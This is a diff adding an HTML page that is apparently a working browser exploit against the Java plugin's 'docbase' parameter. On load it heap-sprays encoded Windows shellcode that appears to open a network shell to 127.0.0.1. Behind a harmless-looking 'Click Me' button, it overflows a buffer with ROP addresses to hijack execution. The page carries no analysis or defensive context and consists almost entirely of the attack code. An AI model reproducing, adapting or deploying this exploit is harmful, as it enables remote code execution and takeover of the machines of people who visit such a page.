@@ -1,0 +1,50 @@
+<html>
+<head>
+   <link rel="shortcut icon" href="http://127.0.0.1:9999/x.ico" />
+   <script>
+
+   var a = new Array();
+
+   function heap_spray() {
+
+      var shellcode = unescape("%u4242%u4242%u4cc1%u7c34%ua158%u7c37%u64bf%u7c35%u2208%u0808%u4000%u0000%u0040%u0000%u0a0a%u0a0a%u2208%u0808%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u685d%u3233%u0000%u7768%u3273%u545f%u4c68%u2677%uff07%ub8d5%u0190%u0000%uc429%u5054%u2968%u6b80%uff00%u50d5%u5050%u4050%u4050%u6850%u0fea%ue0df%ud5ff%u6a97%u6805%u007f%u0100%u0268%u1a00%u890a%u6ae6%u5610%u6857%ua599%u6174%ud5ff%uc085%u0c74%u4eff%u7508%u68ec%ub5f0%u56a2%ud5ff%u6368%u646d%u8900%u57e3%u5757%uf631%u126a%u5659%ufde2%uc766%u2444%u013c%u8d01%u2444%uc610%u4400%u5054%u5656%u4656%u4e56%u5656%u5653%u7968%u3fcc%uff86%u89d5%u4ee0%u4656%u30ff%u0868%u1d87%uff60%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff")
+      
+      while(shellcode.length <= 100000) {
+         shellcode += shellcode;
+      }
+
+      var a_megabyte = shellcode.substr(0, (1024*64)/2);
+
+      for(i = 0; i<14; i++) {
+          a_megabyte += shellcode.substr(0, (1024*64)/2);
+      }
+
+      a_megabyte += shellcode.substr(0, (1024*64/2)-(38/2));
+
+      for(i = 0; i < 100; i++){
+        a[i] = a_megabyte.substr(0, a_megabyte.length);
+      }
+   }
+
+   function trigger() {
+      var buf = "";
+      for(i = 0; i < 388; i++){
+          buf += "\x41";
+      }
+      buf += "\xcc\x0c\x08\x08"; // ebp : make it the beggining of rop frames
+      buf += "\xa4\x11\x34\x7c"; // eip : ret; leave
+
+      var htmlTags =
+         "<object type='application/x-java-applet'>" +
+         "<param name='launchjnlp' value='1'>" +
+         "<param name='docbase' value='" + buf + "'>" +
+         "</object>";
+
+      document.write(htmlTags);
+   }
+   </script>
+</head>
+<body onload="heap_spray()">
+   <input type="button" value="Click Me" onclick="trigger()">
+</body>
+</html>
